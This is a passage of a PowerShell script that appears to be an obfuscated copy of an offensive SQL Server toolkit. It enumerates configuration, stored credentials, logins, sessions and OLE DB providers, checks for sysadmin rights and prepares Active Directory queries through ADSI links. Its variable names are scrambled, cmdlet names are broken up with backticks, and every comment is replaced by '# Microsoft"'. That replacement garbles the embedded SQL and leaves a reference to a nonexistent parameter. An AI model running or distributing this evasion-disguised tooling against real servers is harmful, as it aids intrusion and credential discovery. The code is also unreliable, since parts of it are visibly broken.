        $BusyFlash = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $TradeSpicy = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $null = $TradeSpicy.Columns.Add('ComputerName')
        $null = $TradeSpicy.Columns.Add('Instance')
        $null = $TradeSpicy.Columns.Add('Name')
        $null = $TradeSpicy.Columns.Add('Minimum')
        $null = $TradeSpicy.Columns.Add('Maximum')
        $null = $TradeSpicy.Columns.Add('config_value')
        $null = $TradeSpicy.Columns.Add('run_value')


        # Microsoft".
        $TinyHealth = ne`w`-ob`je`ct -TypeName System.Data.DataTable

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        if($Instance)
        {
            $BeefSpy = ne`w`-ob`je`ct -TypeName PSObject -Property @{
                Instance = $Instance
            }
        }

        # Microsoft".
        $TinyHealth = $TinyHealth + $BeefSpy
    }

    Process
    {
        # Microsoft".
        $TinyHealth = $TinyHealth + $_
    }

    End
    {
        # Microsoft".
        $SecondElite = {
            $Instance = $_.Instance

            # Microsoft".
            $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

            # Microsoft".
            if(-not $Instance)
            {
                $Instance = $env:COMPUTERNAME
            }

            # Microsoft".
            if($PuffyCrack)
            {
                # Microsoft".
                $ExtendSmelly = Get-SQLConnectionObject -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -PuffyCrack -StitchFace $StitchFace
            }
            else
            {
                # Microsoft".
                $ExtendSmelly = Get-SQLConnectionObject -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -StitchFace $StitchFace
            }

            # Microsoft".
            try
            {
                # Microsoft".
                $ExtendSmelly.Open()

                if(-not $RaggedQuill)
                {
                    Write-Verbose -Message "$Instance : Connection Success."
                }

                # Microsoft".
                $BottleSturdy = 0

                # Microsoft".
                $CurlTick = Get-SQLQuery -Instance $Instance -BoringLarge "sp_configure 'Show Advanced Options'" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Select-Object -Property config_value -ExpandProperty config_value

                # Microsoft".
                $LovingDry = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -RaggedQuill | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin

                # Microsoft".
                if ($CurlTick -eq 1)
                {
                    if(-not $RaggedQuill)
                    {
                        Write-Verbose -Message "$Instance : Show Advanced Options is already enabled."
                    }
                }
                else
                {
                    if(-not $RaggedQuill)
                    {
                        Write-Verbose -Message "$Instance : Show Advanced Options is disabled."
                    }

                    if($LovingDry -eq 'Yes')
                    {
                        if(-not $RaggedQuill)
                        {
                            Write-Verbose -Message "$Instance : Your a sysadmin, trying to enabled it."
                        }

                        # Microsoft".
                        Get-SQLQuery -Instance $Instance -BoringLarge "sp_configure 'Show Advanced Options',1;RECONFIGURE" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill

                        # Microsoft".
                        $ShutWhine = Get-SQLQuery -Instance $Instance -BoringLarge "sp_configure 'Show Advanced Options'" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Select-Object -Property config_value -ExpandProperty config_value

                        if ($ShutWhine -eq 1)
                        {
                            $BottleSturdy = 1
                            if(-not $RaggedQuill)
                            {
                                Write-Verbose -Message "$Instance : Enabled Show Advanced Options."
                            }
                        }
                        else
                        {
                            if(-not $RaggedQuill)
                            {
                                Write-Verbose -Message "$Instance : Enabling Show Advanced Options failed. Aborting."
                            }
                        }
                    }
                }

                # Microsoft".
                Get-SQLQuery -Instance $Instance -BoringLarge 'sp_configure' -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill |
                ForEach-Object -Process {
                    $SleetCruel = $_.name
                    $DogBloody = $_.minimum
                    $WaryScrew = $_.maximum
                    $BrawnyRegret = $_.config_value
                    $TallLinen = $_.run_value

                    $null = $TradeSpicy.Rows.Add($HauntGusty, $Instance, $SleetCruel, $DogBloody, $WaryScrew, $BrawnyRegret, $TallLinen)
                }

                # Microsoft".
                if($BottleSturdy -eq 1 -and $LovingDry -eq 'Yes')
                {
                    if(-not $RaggedQuill)
                    {
                        Write-Verbose -Message "$Instance : Disabling Show Advanced Options"
                    }
                    $FrailCarve = Get-SQLQuery -Instance $Instance -BoringLarge "sp_configure 'Show Advanced Options',0;RECONFIGURE" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
                }

                # Microsoft".
                $ExtendSmelly.Close()

                # Microsoft".
                $ExtendSmelly.Dispose()
            }
            catch
            {
                # Microsoft".
                if(-not $RaggedQuill)
                {
                    $ErrorMessage = $_.Exception.Message
                    Write-Verbose -Message "$Instance : Connection Failed."
                    # Microsoft".
                }
            }
        }

        # Microsoft".
        $TinyHealth | Invoke-Parallel -PlacidSleet $SecondElite -MateEasy -RhymeCoach -RouteWink $ItchyJuice -ShirtStory 2 -MassHope -ErrorAction SilentlyContinue

        return $TradeSpicy
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLServerCredential
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Credential name.')]
        [string]$CredentialName,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        $InformDrunk = ne`w`-ob`je`ct -TypeName System.Data.DataTable

        # Microsoft".
        if($CredentialName)
        {
            $CredentialNameFilter = " WHERE name like '$CredentialName'"
        }
        else
        {
            $CredentialNameFilter = ''
        }
    }

    Process
    {
        # Microsoft".
        $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($HoneyHusky)
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Microsoft".
        $BoringLarge = "  USE master;
            SELECT  '$HauntGusty' as [ComputerName],
            '$Instance' as [Instance],
            credential_id,
            name as [CredentialName],
            credential_identity,
            create_date,
            modify_date,
            target_type,
            target_id
            FROM [master].[sys].[credentials]
        $CredentialNameFilter"

        # Microsoft".
        $TradeSpicy = Get-SQLQuery -Instance $Instance -BoringLarge $BoringLarge -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill

        # Microsoft".
        $InformDrunk = $InformDrunk + $TradeSpicy
    }

    End
    {
        # Microsoft".
        $InformDrunk
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLServerLogin
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Principal name to filter for.')]
        [string]$BasinEnter,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        $ObeseSave = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $null = $ObeseSave.Columns.Add('ComputerName')
        $null = $ObeseSave.Columns.Add('Instance')
        $null = $ObeseSave.Columns.Add('PrincipalId')
        $null = $ObeseSave.Columns.Add('PrincipalName')
        $null = $ObeseSave.Columns.Add('PrincipalSid')
        $null = $ObeseSave.Columns.Add('PrincipalType')
        $null = $ObeseSave.Columns.Add('CreateDate')
        $null = $ObeseSave.Columns.Add('IsLocked')

        # Microsoft".
        if($BasinEnter)
        {
            $SipWomen = " and name like '$BasinEnter'"
        }
        else
        {
            $SipWomen = ''
        }
    }

    Process
    {
        # Microsoft".

        # Microsoft".
        $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($HoneyHusky)
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Microsoft".
        $BoringLarge = "  USE master;
            SELECT  '$HauntGusty' as [ComputerName],
            '$Instance' as [Instance],principal_id as [PrincipalId],
            name as [PrincipalName],
            sid as [PrincipalSid],
            type_desc as [PrincipalType],
            create_date as [CreateDate],
            LOGINPROPERTY ( name , 'IsLocked' ) as [IsLocked]
            FROM [sys].[server_principals]
            WHERE type = 'S' or type = 'U' or type = 'C'
        $SipWomen"

        # Microsoft".
        $TradeSpicy = Get-SQLQuery -Instance $Instance -BoringLarge $BoringLarge -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill

        # Microsoft".
        $TradeSpicy |
        ForEach-Object -Process {
            # Microsoft".
            $WaxTease = [System.BitConverter]::ToString($_.PrincipalSid).Replace('-','')
            if ($WaxTease.length -le 10)
            {
                $GrassPhobic = [Convert]::ToInt32($WaxTease,16)
            }
            else
            {
                $GrassPhobic = $WaxTease
            }

            # Microsoft".
            $null = $ObeseSave.Rows.Add(
                [string]$_.ComputerName,
                [string]$_.Instance,
                [string]$_.PrincipalId,
                [string]$_.PrincipalName,
                $GrassPhobic,
                [string]$_.PrincipalType,
                $_.CreateDate,
            [string]$_.IsLocked)
        }
    }

    End
    {
        # Microsoft".
        $ObeseSave
    }
}




# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLSession
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'PrincipalName.')]
        [string]$BasinEnter,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        $CuteSleepy = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $null = $CuteSleepy.Columns.Add('ComputerName')
        $null = $CuteSleepy.Columns.Add('Instance')
        $null = $CuteSleepy.Columns.Add('PrincipalSid')
        $null = $CuteSleepy.Columns.Add('PrincipalName')
        $null = $CuteSleepy.Columns.Add('OriginalPrincipalName')
        $null = $CuteSleepy.Columns.Add('SessionId')
        $null = $CuteSleepy.Columns.Add('SessionStartTime')
        $null = $CuteSleepy.Columns.Add('SessionLoginTime')
        $null = $CuteSleepy.Columns.Add('SessionStatus')

        # Microsoft".
        if($BasinEnter)
        {
            $SipWomen = " and login_name like '$BasinEnter'"
        }
        else
        {
            $SipWomen = ''
        }
    }

    Process
    {
        # Microsoft".

        # Microsoft".
        $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($HoneyHusky)
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Microsoft".
        $BoringLarge = "  USE master;
            SELECT  '$HauntGusty' as [ComputerName],
            '$Instance' as [Instance],
            security_id as [PrincipalSid],
            login_name as [PrincipalName],
            original_login_name as [OriginalPrincipalName],
            session_id as [SessionId],
            last_request_start_time as [SessionStartTime],
            login_time as [SessionLoginTime],
            status as [SessionStatus]
            FROM    [sys].[dm_exec_sessions]
            ORDER BY status
        $SipWomen"

        # Microsoft".
        $TradeSpicy = Get-SQLQuery -Instance $Instance -BoringLarge $BoringLarge -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill

        # Microsoft".
        $TradeSpicy |
        ForEach-Object -Process {
            # Microsoft".
            $WaxTease = [System.BitConverter]::ToString($_.PrincipalSid).Replace('-','')
            if ($WaxTease.length -le 10)
            {
                $GrassPhobic = [Convert]::ToInt32($WaxTease,16)
            }
            else
            {
                $GrassPhobic = $WaxTease
            }

            # Microsoft".
            $null = $CuteSleepy.Rows.Add(
                [string]$_.ComputerName,
                [string]$_.Instance,
                $GrassPhobic,
                [string]$_.PrincipalName,
                [string]$_.OriginalPrincipalName,
                [string]$_.SessionId,
                [string]$_.SessionStartTime,
                [string]$_.SessionLoginTime,
            [string]$_.SessionStatus)
        }
    }

    End
    {
        # Microsoft".
        $CuteSleepy
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLOleDbProvder
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
     
        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$ItchyJuice = 2,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        $TradeSpicy = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $SlopeStale = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $null = $SlopeStale.Columns.Add('ComputerName') 
        $null = $SlopeStale.Columns.Add('Instance') 
        $null = $SlopeStale.Columns.Add('ProviderName') 
        $null = $SlopeStale.Columns.Add('ProviderDescription')
        $null = $SlopeStale.Columns.Add('ProviderParseName')
        $null = $SlopeStale.Columns.Add('AllowInProcess')
        $null = $SlopeStale.Columns.Add('DisallowAdHocAccess')
        $null = $SlopeStale.Columns.Add('DynamicParameters') 
        $null = $SlopeStale.Columns.Add('IndexAsAccessPath') 
        $null = $SlopeStale.Columns.Add('LevelZeroOnly') 
        $null = $SlopeStale.Columns.Add('NestedQueries') 
        $null = $SlopeStale.Columns.Add('NonTransactedUpdates') 
        $null = $SlopeStale.Columns.Add('SqlServerLIKE')

        # Microsoft".
        $TinyHealth = ne`w`-ob`je`ct -TypeName System.Data.DataTable


        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        if($Instance)
        {
            $BeefSpy = ne`w`-ob`je`ct -TypeName PSObject -Property @{
                Instance = $Instance
            }
        }

        # Microsoft".
        $TinyHealth = $TinyHealth + $BeefSpy
    }

    Process
    {
        # Microsoft".
        $TinyHealth = $TinyHealth + $_
    }

    End
    {
        # Microsoft".
        $SecondElite = {
            # Microsoft".
            $Instance = $_.Instance

            # Microsoft".
            $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

            # Microsoft".
            $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
                $_.Status -eq 'Accessible'
            }
            if($HoneyHusky)
            {
                if( -not $RaggedQuill)
                {
                    Write-Verbose -Message "$Instance : Connection Success."
                }
            }
            else
            {
                if( -not $RaggedQuill)
                {
                    Write-Verbose -Message "$Instance : Connection Failed."
                }
                return
            }

            # Microsoft".
            $LovingDry = Get-SQLServerInfo -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin
            if($LovingDry -eq "No")
            {
                If (-not($RaggedQuill)){
                    Write-Verbose -Message "$Instance : This command requires sysadmin privileges. Exiting."  
                }              
                return
            }else{
                
                If (-not($RaggedQuill)){
                    Write-Verbose -Message "$Instance : You have sysadmin privileges."
                    Write-Verbose -Message "$Instance : Grabbing list of providers."
                }
            }            

            # Microsoft".
            $BoringLarge = "                        

            -- Name: Get-SQLOleDbProvider.sql
            -- Description: Get a list of OLE provider along with their current settings.
            -- Author: Scott Sutherland, NetSPI 2017

            -- Get a list of providers
            CREATE TABLE # Microsoft".
            [ParseName] varchar(8000),
            [ProviderDescription] varchar(8000))

            INSERT INTO # Microsoft".
            EXEC xp_enum_oledb_providers

            -- Create temp table for provider information
            CREATE TABLE # Microsoft".
            [ProviderDescription] varchar(8000),
            [ProviderParseName] varchar(8000),
            [AllowInProcess] int, 
            [DisallowAdHocAccess] int, 
            [DynamicParameters] int,  
            [IndexAsAccessPath] int,  
            [LevelZeroOnly] int,  
            [NestedQueries] int,  
            [NonTransactedUpdates] int,  
            [SqlServerLIKE] int)

            -- Setup required variables for cursor
            DECLARE @Provider_name varchar(8000);
            DECLARE @Provider_parse_name varchar(8000);
            DECLARE @Provider_description varchar(8000);
            DECLARE @property_name varchar(8000)
            DECLARE @regpath nvarchar(512)  

            -- Start cursor
            DECLARE MY_CURSOR1 CURSOR
            FOR
            SELECT * FROM # Microsoft".
            OPEN MY_CURSOR1
            FETCH NEXT FROM MY_CURSOR1 INTO @Provider_name,@Provider_parse_name,@Provider_description
            WHILE @@FETCH_STATUS = 0 
  
	            BEGIN  
		
	            -- Set the registry path
	            SET @regpath = N'SOFTWARE\Microsoft\MSSQLServer\Providers\' + @provider_name  

	            -- AllowInProcess	
	             DECLARE @AllowInProcess int 
	             SET @AllowInProcess = 0 
	             exec sys.xp_instance_regread N'HKEY_LOCAL_MACHINE',@regpath,'AllowInProcess',	@AllowInProcess OUTPUT		 
	             IF @AllowInProcess IS NULL 
	             SET @AllowInProcess = 0

	            -- DisallowAdHocAccess 
	             DECLARE @DisallowAdHocAccess int  
	             SET @DisallowAdHocAccess = 0
	             exec sys.xp_instance_regread N'HKEY_LOCAL_MACHINE',@regpath,'DisallowAdHocAccess',	@DisallowAdHocAccess OUTPUT	 
	             IF @DisallowAdHocAccess IS NULL 
	             SET @DisallowAdHocAccess = 0

	            -- DynamicParameters 
	             DECLARE @DynamicParameters  int  
	             SET @DynamicParameters  = 0
	             exec sys.xp_instance_regread N'HKEY_LOCAL_MACHINE',@regpath,'DynamicParameters',	@DynamicParameters OUTPUT	 
	             IF @DynamicParameters  IS NULL 
	             SET @DynamicParameters  = 0

	            -- IndexAsAccessPath 
	             DECLARE @IndexAsAccessPath int 
	             SET @IndexAsAccessPath = 0 
	             exec sys.xp_instance_regread N'HKEY_LOCAL_MACHINE',@regpath,'IndexAsAccessPath',	@IndexAsAccessPath OUTPUT	 
	             IF @IndexAsAccessPath IS NULL 
	             SET @IndexAsAccessPath  = 0

	            -- LevelZeroOnly 
	             DECLARE @LevelZeroOnly int
	             SET @LevelZeroOnly  = 0
	             exec sys.xp_instance_regread N'HKEY_LOCAL_MACHINE',@regpath,'LevelZeroOnly',	@LevelZeroOnly OUTPUT	
	             IF  @LevelZeroOnly IS NULL 
	             SET  @LevelZeroOnly  = 0	  

	            -- NestedQueries 
	             DECLARE @NestedQueries int  
	             SET @NestedQueries = 0
	             exec sys.xp_instance_regread N'HKEY_LOCAL_MACHINE',@regpath,'NestedQueries',	@NestedQueries OUTPUT
	             IF   @NestedQueries IS NULL 
	             SET  @NestedQueries = 0		 	 

	            -- NonTransactedUpdates 
	             DECLARE @NonTransactedUpdates int  
	             SET @NonTransactedUpdates = 0
	             exec sys.xp_instance_regread N'HKEY_LOCAL_MACHINE',@regpath,'NonTransactedUpdates',	@NonTransactedUpdates  OUTPUT	 
	             IF  @NonTransactedUpdates IS NULL 
	             SET @NonTransactedUpdates = 0

	            -- SqlServerLIKE
	             DECLARE @SqlServerLIKE int  
	             SET @SqlServerLIKE  = 0
	             exec sys.xp_instance_regread N'HKEY_LOCAL_MACHINE',@regpath,'SqlServerLIKE',	@SqlServerLIKE OUTPUT	
	             IF  @SqlServerLIKE IS NULL 
	             SET @SqlServerLIKE = 0 

	            -- Add the full provider record to the temp table
	            INSERT INTO # Microsoft".
	            VALUES (@Provider_name,@Provider_description,@Provider_parse_name,@AllowInProcess,@DisallowAdHocAccess,@DynamicParameters,@IndexAsAccessPath,@LevelZeroOnly,@NestedQueries,@NonTransactedUpdates,@SqlServerLIKE);

	            FETCH NEXT FROM MY_CURSOR1 INTO  @Provider_name,@Provider_parse_name,@Provider_description

	            END   

            -- Return records
            SELECT * FROM # Microsoft".

            -- Clean up
            CLOSE MY_CURSOR1
            DEALLOCATE MY_CURSOR1
            DROP TABLE # Microsoft".
            DROP TABLE # Microsoft".
          
            # Microsoft".
            $TradeSpicy = Get-SQLQuery -Instance $Instance -BoringLarge $BoringLarge -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill

            # Microsoft".
            $TradeSpicy |
            ForEach-Object -Process {

                # Microsoft".
                $null = $SlopeStale.Rows.Add(
                    $HauntGusty,
                    $Instance,
                    $_.ProviderName,
                    $_.ProviderDescription,
                    $_.ProviderParseName,
                    $_.AllowInProcess,
                    $_.DisallowAdHocAccess,
                    $_.DynamicParameters,
                    $_.IndexAsAccessPath,
                    $_.LevelZeroOnly,
                    $_.NestedQueries,
                    $_.NonTransactedUpdates,
                    $_.SqlServerLIKE
                )
            }
        }

        # Microsoft".
        $TinyHealth | Invoke-Parallel -PlacidSleet $SecondElite -MateEasy -RhymeCoach -RouteWink $ItchyJuice -ShirtStory 2 -MassHope -ErrorAction SilentlyContinue

        return $SlopeStale
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLDomainObject
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate to SQL Server.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate to SQL Server.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$SmokePushy,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account password used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LyingBells,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
            ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.')]
        [Switch]$PetsIcy,
     
        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.  This is the number of instance to process at a time')]
        [int]$ItchyJuice = 2,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Ldap path. domain/dc=domain,dc=local')]
        [string]$FuelExist,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Ldap filter. Example: (&(objectCategory=Person)(objectClass=user))')]
        [string]$SinStitch,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Ldap fields. Example: samaccountname,name,admincount,whencreated,whenchanged,adspath')]
        [string]$LowlyBoil,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        $TradeSpicy = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $JoyousRisk = ne`w`-ob`je`ct -TypeName System.Data.DataTable         
    }

    Process
    {
        # Microsoft".
        $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($HoneyHusky)
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Microsoft".
        $SmilePie = Get-SQLServerInfo -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
        $ScrubCry = $SmilePie.DomainName
        $LovingDry = $SmilePie.IsSysadmin
        $FloatPlug = $SmilePie.ServiceAccount
        $CrowHug = $SmilePie.SQLServerMajorVersion
        $PoisedSnotty = $SmilePie.SQLServerEdition
        $UncleLine = $SmilePie.SQLServerVersionNumber
        $KillCopy = $SmilePie.Currentlogin

        # Microsoft".
        If (-not($RaggedQuill)){
            Write-Verbose -Message "$instance : Login: $KillCopy"
            Write-Verbose -Message "$Instance : Domain: $ScrubCry"
            Write-Verbose -Message "$Instance : Version: SQL Server $CrowHug $PoisedSnotty ($UncleLine)"
        }
         
        if($LovingDry -eq "No")
        {
            If (-not($RaggedQuill)){
                Write-Verbose -Message "$Instance : Sysadmin: No"
                Write-Verbose -Message "$Instance : This command requires sysadmin privileges. Exiting."  
            }          
            return
        }else{
            
            If (-not($RaggedQuill)){
                Write-Verbose -Message "$Instance : Sysadmin: Yes"
            }
        }          

        # Microsoft".
        # Microsoft".
        if ($KillCopy -notlike "*\*")
        {
            if(($PetsIcy) -or ($LyingBells)){
                # Microsoft".
            }else{
                Write-Verbose -Message "$Instance : A SQL Login with sysadmin privileges cannot execute ASDI queries through a linked server by itself."
                Write-Verbose -Message "$Instance : Try one of the following:"
                Write-Verbose -Message "$Instance :  - Run the command again with the -PetsIcy flag "
                Write-Verbose -Message "$Instance :  - Run the command again and provide -KissKnock and -LyingBells"
                return
            }
        }
        
        # Microsoft".
        if(-not $FuelExist ){
            $FuelExist = $ScrubCry
        }

        # Microsoft".
        $PlateReign = Get-SQLOleDbProvder -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -RaggedQuill | Where ProviderName -like "ADsDSOObject" | Select-Object AllowInProcess -ExpandProperty AllowInProcess
        if ($PlateReign -ne 1){
            Write-Verbose -Message "$Instance : ADsDSOObject provider allowed to run in process: No"
            Write-Verbose -Message "$Instance : The ADsDSOObject provider is not allowed to run in process. Stopping operation."
            return
        }else{
            Write-Verbose -Message "$Instance : ADsDSOObject provider allowed to run in process: Yes"
        }

        # Microsoft".
        if($PetsIcy){
            If (-not($RaggedQuill)){                

                if ($KillCopy -like "*\*"){
                    Write-Verbose -Message "$Instance : Executing in AdHoc mode using OpenRowSet as '$KillCopy'."
                }else{
                    if(-not $SmokePushy){
                        Write-Verbose -Message "$Instance : Executing in AdHoc mode using OpenRowSet as the SQL Server service account ($FloatPlug)."
                    }else{
